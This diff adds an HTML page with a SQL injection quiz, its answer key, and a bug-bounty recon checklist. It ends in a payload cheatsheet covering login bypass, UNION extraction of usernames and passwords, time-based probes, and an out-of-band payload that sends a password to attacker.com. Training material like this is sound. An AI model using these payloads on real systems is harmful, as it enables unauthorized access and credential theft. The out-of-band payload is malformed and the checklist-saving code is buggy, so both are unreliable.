@@ -1,0 +1,322 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<title>SQL Injection — Exam & Recon Kit</title>
+<style>
+:root{
+  --bg:#02040a; --panel:#0a101e; --line:#162133;
+  --text:#b0c4de; --dim:#5a7393; --accent:#ff00ff; --bad:#ff4d4d;
+  --mono:'JetBrains Mono','Fira Code','Consolas',monospace;
+}
+*{box-sizing:border-box;}
+body{margin:0;background:var(--bg);color:var(--text);font-family:var(--mono);min-height:100vh;}
+.wrap{max-width:720px;margin:0 auto;padding:32px 20px 60px;}
+.tag{color:var(--accent);letter-spacing:.15em;font-size:12px;text-transform:uppercase;font-weight:bold;text-shadow:0 0 5px var(--accent);}
+h1{font-size:22px;margin:6px 0 26px;color:#fff;text-shadow:0 0 8px rgba(255,0,255,0.3);}
+.bar{height:4px;background:var(--line);border-radius:2px;overflow:hidden;margin-bottom:22px;}
+.bar>div{height:100%;background:var(--accent);transition:width .3s;box-shadow:0 0 10px var(--accent);}
+.card{background:var(--panel);border:1px solid var(--line);border-radius:10px;padding:22px;box-shadow:0 0 20px rgba(0,0,0,0.5);}
+.qnum{color:var(--dim);font-size:12px;margin-bottom:10px;}
+.qtext{font-size:16px;color:#fff;margin-bottom:18px;line-height:1.5;}
+.opt{display:block;width:100%;text-align:left;background:#06080f;border:1px solid var(--line);
+  color:var(--text);padding:12px 14px;border-radius:7px;margin-bottom:10px;cursor:pointer;
+  font-family:var(--mono);font-size:13.5px;transition:.15s;}
+.opt:hover{border-color:var(--accent);background:#13061f;box-shadow:0 0 8px rgba(255,0,255,0.2);}
+.opt.correct{background:#1f0a2a;border-color:var(--accent);color:var(--accent);text-shadow:0 0 5px var(--accent);}
+.opt.wrong{background:#2a0a0a;border-color:var(--bad);color:var(--bad);text-shadow:0 0 5px var(--bad);}
+.opt[disabled]{cursor:default;}
+.score{color:var(--dim);font-size:13px;}
+.center{text-align:center;}
+.big{font-size:44px;color:var(--accent);margin:10px 0;text-shadow:0 0 15px var(--accent);}
+.btn{background:var(--accent);color:#02040a;border:none;padding:12px 20px;border-radius:7px;
+  font-family:var(--mono);font-weight:bold;cursor:pointer;margin:6px 6px 0 0;font-size:13px;}
+.btn.alt{background:transparent;border:1px solid var(--accent);color:var(--accent);box-shadow:0 0 5px rgba(255,0,255,0.3);}
+.emoji{font-size:26px;position:fixed;top:-30px;animation:fall linear forwards;pointer-events:none;z-index:9999;text-shadow:0 0 10px var(--accent);}
+@keyframes fall{to{transform:translateY(105vh) rotate(360deg);opacity:.2;}}
+h2{color:#fff;font-size:15px;border-bottom:1px solid var(--line);padding-bottom:8px;margin-top:30px;}
+h3{color:var(--accent);font-size:14px;margin-top:20px;margin-bottom:5px;text-shadow:0 0 5px rgba(255,0,255,0.5);}
+.chk{display:flex;gap:10px;align-items:flex-start;padding:8px 0;border-bottom:1px dashed var(--line);font-size:13.5px;}
+.chk input{margin-top:3px;accent-color:var(--accent);}
+.chk.done label{color:var(--dim);text-decoration:line-through;}
+pre{background:#06080f;border:1px solid var(--line);border-radius:7px;padding:12px 14px;
+  overflow-x:auto;font-size:12.5px;color:#f5e6ff;margin:8px 0 4px;box-shadow:inset 0 0 10px rgba(0,0,0,0.5);}
+.pname{color:var(--accent);font-size:12.5px;margin-top:16px;}
+#quizView,#kitView{display:none;}
+.explain{margin-top:12px;padding:12px 14px;background:#06080f;border:1px solid var(--line);
+  border-radius:7px;font-size:13px;color:var(--dim);line-height:1.5;display:none;}
+.explain b{color:var(--accent);}
+.topbtn{margin-bottom:18px;}
+#nextBtn{display:none;margin-top:16px;}
+</style>
+</head>
+<body>
+<div class="wrap">
+  <div class="tag">WVAPT // SQL Exploitation</div>
+  <h1 id="pageTitle">Concept Check — 20 Questions</h1>
+
+  <div id="quizView">
+    <button class="btn alt topbtn" onclick="showKit()">Skip → Bug Bounty Checklist + Payloads</button>
+    <div class="bar"><div id="prog" style="width:0%"></div></div>
+    <div class="card">
+      <div class="qnum"><span id="qIndex">1</span>/20 &nbsp;·&nbsp; <span class="score">score: <span id="scoreLive">0</span></span></div>
+      <div class="qtext" id="qText"></div>
+      <div id="opts"></div>
+      <div class="explain" id="explain"></div>
+      <button class="btn" id="nextBtn" onclick="goNext()">Next →</button>
+    </div>
+  </div>
+
+  <div id="doneView" class="card center" style="display:none;">
+    <div class="tag">Result</div>
+    <div class="big"><span id="finalScore">0</span>/20</div>
+    <div id="finalMsg" style="color:var(--dim);margin-bottom:16px;"></div>
+    <button class="btn" onclick="restart()">Retake Exam</button>
+    <button class="btn alt" onclick="showKit()">Bug Bounty Checklist + Payloads →</button>
+  </div>
+
+  <div id="kitView">
+    <button class="btn alt" onclick="showQuiz()">← Back to Exam</button>
+
+    <h2>Recon Checklist</h2>
+    <div id="checklist"></div>
+
+    <h2>Payload Cheatsheet</h2>
+    <div id="payloads"></div>
+  </div>
+</div>
+
+<script>
+// Exam-level difficulty: All options are nearly identical in length to prevent guessing.
+const Q=[
+["What is the root cause of SQL Injection?",["Directly concatenating user input into SQL queries","Failing to encrypt the database connections entirely","Using weak administrative passwords for the server","Missing HTTPS encryption on the web server safely"],0,
+"SQLi occurs when user input is concatenated directly into queries, allowing the input to alter the SQL logic."],
+["Which character is commonly used first to test for SQL Injection?",["Using the single quote character directly","Using the double quote character directly","Using the backtick character safely now","Using the hashtag character safely now"],0,
+"The single quote (') is used to break out of string boundaries in the SQL query to trigger syntax errors."],
+["Which payload is commonly used to make a WHERE condition always TRUE?",["Injecting the payload OR 1=1 into the clause","Injecting the payload AND 1=1 into the clause","Injecting the payload OR 1=2 into the clause","Injecting the payload AND 1=2 into clause"],0,
+"OR 1=1 forces the database to return true for all rows, bypassing authentication or filtering logic."],
+["What does the -- operator do in SQL?",["It starts a SQL comment to ignore the rest safely","It deletes a SQL table from the database server","It encrypts the SQL data using standard logic","It terminates the SQL connection to the server"],0,
+"The -- sequence comments out the remainder of the query, ignoring original logic like password checks."],
+["Which SQL Injection technique retrieves data from another table using the application's response?",["The UNION-based SQL injection technique safely","The Boolean-based SQL injection technique now","The Time-based SQL injection technique fully","The Error-based SQL injection technique now"],0,
+"UNION-based SQLi appends a SELECT statement to the original query, extracting data from other tables visibly."],
+["Before performing a UNION attack, what should you determine first?",["The exact number of columns returned by query","The exact version of the database server now","The exact IP address of the backend server","The exact administrative password safely"],0,
+"The UNION requires both queries to return the exact same number of columns to execute successfully."],
+["Which SQL clause is commonly used to discover the number of columns?",["The ORDER BY clause within the SQL statement","The GROUP BY clause within the SQL statement","The LIMIT BY clause within the SQL statement","The INSERT BY clause within the SQL statement"],0,
+"By incrementing the ORDER BY index until an error occurs, attackers find the exact column count."],
+["Why is NULL commonly used in UNION SELECT?",["Because it is compatible with most data types","Because it automatically deletes table records","Because it significantly speeds up the queries","Because it easily bypasses the authentication"],0,
+"NULL can be cast to string, integer, or other types, preventing type mismatch errors during UNION injection."],
+["Which statement best describes Blind SQL Injection?",["No query results are displayed, so attackers infer information","Query results are displayed directly in the browser","Database errors are always shown to the attacker","It only works on Oracle databases running here"],0,
+"In Blind SQLi, the application doesn't return data or errors directly. Attackers infer data using true/false conditions."],
+["Which is NOT a type of Blind SQL Injection?",["The UNION-based SQL injection technique safely","The Boolean-based SQL injection technique fully","The Time-based SQL injection technique exactly","The Out-of-band SQL injection technique here"],0,
+"UNION-based is not blind; it directly displays the extracted data in the application's HTTP response."],
+["Which attack infers data by observing page differences between TRUE and FALSE conditions?",["The Boolean-based Blind SQLi technique","The UNION-based SQLi technique directly","The Error-based SQLi technique locally","The XML External Entity attacks locally"],0,
+"Boolean-based relies on the application rendering differently if the injected condition evaluates to true vs false."],
+["Which attack uses intentional delays to infer TRUE or FALSE conditions?",["The Time-based Blind SQLi technique safely","The UNION-based SQLi technique directly","The LDAP Injection technique completely","The Cross-Site Scripting technique locally"],0,
+"Time-based SQLi uses functions like SLEEP() to pause execution if a condition is true, measuring the response delay."],
+["What is Second-Order SQL Injection?",["SQLi stored first and triggered later securely","SQLi executed immediately upon submission now","SQLi using UNION SELECT statements locally","SQLi using HTTP cookies exclusively and fully"],0,
+"The malicious payload is stored in the database and executed later when the application uses it in another query."],
+["What is considered the best defense against SQL Injection?",["Using Prepared Statements parameterized queries","Implementing strict input length limits securely","Encoding user inputs using Base64 completely","Adding a CAPTCHA to the login form constantly"],0,
+"Prepared statements separate code from data, ensuring user input is treated strictly as data, not executable logic."],
+["Parameterized queries cannot safely parameterize which of the following?",["The dynamic table names used in the SQL query","The standard usernames used in the SQL query","The standard passwords used in the SQL query","The standard email addresses in the SQL query"],0,
+"Database identifiers like table or column names cannot be parameterized; they must be whitelisted."],
+["How should table names or column names be handled if they are dynamic?",["Whitelisting allowed values before execution","URL Encoding them before execution securely","Base64 Encoding them before execution safely","Encrypting them before execution completely"],0,
+"Dynamic identifiers must be mapped against a strict whitelist of known safe values before query execution."],
+["Why do many MySQL payloads end with -- - instead of just --?",["MySQL requires a space after the -- operators","MySQL requires a faster query execution path","MySQL requires bypassing the antivirus scanner","MySQL requires encrypting the payload locally"],0,
+"In MySQL, a comment must be followed by a space. The dash provides the space to ensure the comment works."],
+["Which SQL Injection technique retrieves data through an external service rather than the application's response?",["The Out-of-Band (OAST) technique securely","The UNION-based SQLi technique entirely","The Boolean-based SQLi technique safely","The Second-order SQLi technique locally"],0,
+"OAST uses external DNS or HTTP requests to exfiltrate data when the application response is completely blind."],
+["What is the main goal of SQL Injection?",["Manipulating SQL queries by injecting malicious input","Increasing the website speed by optimizing SQL queries","Encrypting the database using standard secure algorithms","Compressing database records to save the disk space"],0,
+"The goal is to manipulate the backend SQL query's logic to extract, modify, or delete unauthorized data."],
+["Which statement best summarizes SQL Injection?",["User input is treated as SQL code instead of data","SQL Injection only affects MySQL databases locally","SQL Injection only works on standard login forms","SQL Injection always shows database errors safely"],0,
+"SQLi fundamentally exploits the failure to separate code from data, allowing input to execute as commands."]
+];
+
+const CHECKLIST_DATA = [
+  { title: "1. Error-Based Recon", items: [
+    "Input a single quote <code>'</code> in search/login fields to trigger SQL syntax errors.",
+    "Check for database error messages revealing backend type (MySQL, PostgreSQL, Oracle).",
+    "Test boolean logic: <code>' OR 1=1 -- -</code> vs <code>' OR 1=2 -- -</code>."
+  ]},
+  { title: "2. UNION Exploitation", items: [
+    "Determine column count using <code>ORDER BY</code> increments.",
+    "Find visible text columns by injecting <code>UNION SELECT NULL, NULL,...</code>.",
+    "Extract database metadata: <code>UNION SELECT table_name, NULL FROM information_schema.tables</code>."
+  ]},
+  { title: "3. Blind & Time-Based Recon", items: [
+    "Test for Blind SQLi by observing response differences between TRUE/FALSE payloads.",
+    "Use time delays for completely blind endpoints: <code>' AND IF(1=1, SLEEP(5), 0) -- -</code>.",
+    "Extract data character-by-character using <code>SUBSTRING()</code> and conditional delays."
+  ]},
+  { title: "4. Out-of-Band (OAST)", items: [
+    "Use Burp Collaborator to generate an external domain.",
+    "Trigger DNS/HTTP lookups: <code>' UNION SELECT LOAD_FILE('\\\\attacker.com\\test') -- -</code>.",
+    "Monitor Collaborator for incoming DNS requests confirming execution."
+  ]},
+  { title: "5. Authentication Bypass", items: [
+    "Attempt login bypass payloads: <code>admin' -- -</code> or <code>' OR '1'='1</code>.",
+    "Test password reset forms for SQL injection in email fields.",
+    "Check second-order injection points like profile name updates."
+  ]}
+];
+
+const PAYLOADS = [
+  { name: "1. Auth Bypass", code: "admin' -- -\n' OR '1'='1' -- -\n' OR 1=1 -- -" },
+  { name: "2. Column Count (ORDER BY)", code: "' ORDER BY 1 -- -\n' ORDER BY 2 -- -\n' ORDER BY 3 -- -" },
+  { name: "3. UNION Data Extraction", code: "' UNION SELECT username, password FROM users -- -\n' UNION SELECT table_name, NULL FROM information_schema.tables -- -" },
+  { name: "4. Time-Based (MySQL)", code: "' AND IF(SUBSTRING(@@version,1,1)='5', SLEEP(5), 0) -- -" },
+  { name: "5. Out-of-Band (MySQL)", code: "' SELECT LOAD_FILE(CONCAT('\\\\\\\\',(SELECT password FROM users LIMIT 1),'.attacker.com\\\\a')) -- -" }
+];
+
+let cur=0,score=0;
+
+function shuffle(a){for(let i=a.length-1;i>0;i--){const j=Math.floor(Math.random()*(i+1));[a[i],a[j]]=[a[j],a[i]];}return a;}
+
+function renderQ(){
+  document.getElementById('prog').style.width=(cur/Q.length*100)+'%';
+  document.getElementById('qIndex').textContent=cur+1;
+  document.getElementById('scoreLive').textContent=score;
+  const [text,opts,correctIdx,why]=Q[cur];
+  document.getElementById('qText').textContent=text;
+  const exp=document.getElementById('explain');
+  exp.style.display='none';exp.innerHTML='';
+  let arr=opts.map((o,i)=>({o,correct:i===correctIdx}));
+  shuffle(arr);
+  const box=document.getElementById('opts');
+  box.innerHTML='';
+  arr.forEach(item=>{
+    const b=document.createElement('button');
+    b.className='opt';b.textContent=item.o;
+    b.onclick=()=>pick(b,item.correct,box,item.o,why,arr);
+    box.appendChild(b);
+  });
+  document.getElementById('nextBtn').style.display='none';
+}
+
+function pick(btn,isCorrect,box,pickedText,why,arr){
+  [...box.children].forEach(c=>c.disabled=true);
+  const exp=document.getElementById('explain');
+  if(isCorrect){
+    btn.classList.add('correct');score++;
+    exp.innerHTML=`<b>Correct.</b> ${why}`;
+  }else{
+    btn.classList.add('wrong');
+    const correctText=arr.find(a=>a.correct).o;
+    [...box.children].forEach(c=>{if(c.textContent===correctText)c.classList.add('correct');});
+    exp.innerHTML=`<b>Correct answer:</b> ${correctText}<br>${why}`;
+  }
+  exp.style.display='block';
+  document.getElementById('scoreLive').textContent=score;
+  const nb=document.getElementById('nextBtn');
+  nb.style.display='inline-block';
+  nb.textContent=(cur+1<Q.length)?'Next →':'See Results →';
+}
+
+function goNext(){
+  cur++;
+  if(cur<Q.length)renderQ();else finish();
+}
+
+function finish(){
+  document.getElementById('prog').style.width='100%';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('doneView').style.display='block';
+  document.getElementById('finalScore').textContent=score;
+  const msg=score===20?"DATABASE OWNED. Full schema extracted.":
+    score>=15?"Solid grasp — revisit the weak spots.":
+    score>=10?"Halfway there — reread the tricky sections.":
+    "Go back through the concept steps before diving into labs.";
+  document.getElementById('finalMsg').textContent=msg;
+  if(score===20) confetti();
+}
+
+function confetti(){
+  const em=['💾','🛢️','💉','🔓','🔑'];
+  for(let i=0;i<30;i++){
+    setTimeout(()=>{
+      const s=document.createElement('div');
+      s.className='emoji';s.textContent=em[Math.floor(Math.random()*em.length)];
+      s.style.left=Math.random()*100+'vw';
+      s.style.animationDuration=(2+Math.random()*1.5)+'s';
+      document.body.appendChild(s);
+      setTimeout(()=>s.remove(),4000);
+    },i*60);
+  }
+}
+
+function restart(){
+  cur=0;score=0;
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('kitView').style.display='none';
+  document.getElementById('quizView').style.display='block';
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+  renderQ();
+}
+
+let cameFromDone=false;
+function showKit(){
+  cameFromDone=document.getElementById('doneView').style.display==='block';
+  document.getElementById('doneView').style.display='none';
+  document.getElementById('quizView').style.display='none';
+  document.getElementById('kitView').style.display='block';
+  document.getElementById('pageTitle').textContent='Bug Bounty Recon Kit';
+}
+function showQuiz(){
+  document.getElementById('kitView').style.display='none';
+  if(cameFromDone){
+    document.getElementById('doneView').style.display='block';
+  }else{
+    document.getElementById('quizView').style.display='block';
+  }
+  document.getElementById('pageTitle').textContent='Concept Check — 20 Questions';
+}
+
+function buildChecklist(){
+  const c=document.getElementById('checklist');
+  const saved=JSON.parse(localStorage.getItem('sqli_cyber_v1')||'{}');
+  let html='';
+  let idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    html += `<h3>${section.title}</h3>`;
+    section.items.forEach(item => {
+      const isChecked = saved[idx] ? 'checked' : '';
+      const isDone = saved[idx] ? ' done' : '';
+      html += `<div class="chk${isDone}">
+        <input type="checkbox" id="c${idx}" ${isChecked}>
+        <label for="c${idx}">${item}</label>
+      </div>`;
+      idx++;
+    });
+  });
+  c.innerHTML = html;
+  
+  idx=0;
+  CHECKLIST_DATA.forEach(section => {
+    section.items.forEach(item => {
+      const checkbox = document.getElementById(`c${idx}`);
+      const row = checkbox.parentElement;
+      checkbox.onchange = e => {
+        saved[idx] = e.target.checked;
+        localStorage.setItem('sqli_cyber_v1', JSON.stringify(saved));
+        row.classList.toggle('done', e.target.checked);
+      };
+      idx++;
+    });
+  });
+}
+
+function buildPayloads(){
+  const p=document.getElementById('payloads');
+  let html='';
+  PAYLOADS.forEach(item => {
+    html += `<div class="pname">${item.name}</div><pre>${item.code}</pre>`;
+  });
+  p.innerHTML = html;
+}
+
+document.getElementById('quizView').style.display='block';
+renderQ();
+buildChecklist();
+buildPayloads();
+</script>
+</body>
+</html>
